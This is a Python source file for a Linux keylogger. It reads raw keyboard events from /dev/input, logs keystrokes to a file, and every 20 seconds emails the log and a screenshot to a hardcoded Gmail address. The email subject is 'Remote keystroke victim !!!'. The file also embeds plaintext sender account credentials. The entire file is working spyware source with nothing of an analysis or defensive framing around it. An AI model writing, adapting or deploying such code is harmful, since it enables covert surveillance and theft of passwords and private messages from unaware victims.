#!/usr/bin/python

import re
import struct
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import time
import pyautogui

USE_TLS = True
SERVER = 'smtp.gmail.com'
EMAIL = "doi2xuyenviet7@gmail.com"
BUF_SIZE = 50
PASS = "@123456789@"
KEYBOARD = "qwerty"

qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[",
    27: "]", 28: "[ENTER]", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "'", 41: "`", 42: "[SHIFT]",
    43: "\\", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ",", 52: ".", 53: "/", 54: "[SHIFT]", 55: "*", 56: "100", 57: "[SPACE]", 58: "[CAPSLOCK]",
    102: "[home]", 107: "[end]", 104: "[pg up]", 109: "[pg dn]", 105: "[RIGHT]", 103: "[UP]",106: "[RIGHT]", 108: "[DOWN]",
    71: "7", 72: "8", 73: "9", 78: "+", 75: "4", 76: "5", 77: "6", 79: "1", 80: "2", 81: "3", 96: "[ENTER]",
    82: "0", 83: ".", 99: "]prt scr]", 111: "[del]", 1: "[ESC]", 69: "[numlk]", 98: "/", 74: "-"
}
#
def get_infile_path():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()

        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013")

        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]

        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)
        print infile_path
        return infile_path

def send_email():
    msg = MIMEMultipart()

    password = PASS
    msg['From'] = EMAIL
    msg['To'] = 'nguyenngocdoanh1998@gmail.com'
    msg['Subject'] = "Remote keystroke victim !!!"

    message = open("log.txt", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((message).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % "log.txt")
    msg.attach(p)

    #myScreenshot = pyautogui.screenshot()
    #myScreenshot.save(r'screen1.png')
    with open("screen1.png", "rb") as f:
        image = MIMEImage(f.read())
        image.add_header('Content-ID', '<{0}>'.format(1))
        msg.attach(image)

    client = smtplib.SMTP_SSL(SERVER,465)
    client.set_debuglevel(True)

    #client.connect(SERVER, 587)
    #if USE_TLS is True:
    #    client.starttls()

    client.login(msg['From'], password)
    client.sendmail(msg['From'], msg['To'], msg.as_string())
    client.quit() 

def main():
    pinfile_path = get_infile_path()
    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)
    print EVENT_SIZE
    start_time = round(time.time())

    infile_path = get_infile_path()
    in_file = open(infile_path, "rb")
    event = in_file.read(EVENT_SIZE)
    typed = ""

    while event:
        print event
        (_, _, type, code, value) = struct.unpack(FORMAT, event)
        #print type, code, value
        if code != 1 and type == 1 and value == 0:
            if code in qwerty_map:
                typed += qwerty_map[code]
                print qwerty_map[code]
        event = in_file.read(EVENT_SIZE)
        if len(typed) > BUF_SIZE:
            with open("log.txt", "a") as f:
                f.write(typed)
                typed = ""
        if round(time.time()) - start_time > 20:
            send_email()
            start_time = round(time.time())
    in_file.close()

def usage():
    print("Usage : python keylogger.py") # noqa
    print("Examples: python keylogger.py")

def init_arg():
    if len(sys.argv) < -1:
        usage()
        exit()
    global SERVER
    global EMAIL
    global USE_TLS
    global BUF_SIZE
    global PASS
    #EMAIL = sys.argv[1]
    #PASS = sys.argv[2]
    #SERVER = sys.argv[3]
    #if sys.argv[1] is "tls":
    #    USE_TLS = True
    #else:
    #    USE_TLS = False
    #BUF_SIZE = int(sys.argv[2])


if __name__ == "__main__":
    init_arg()
    main()
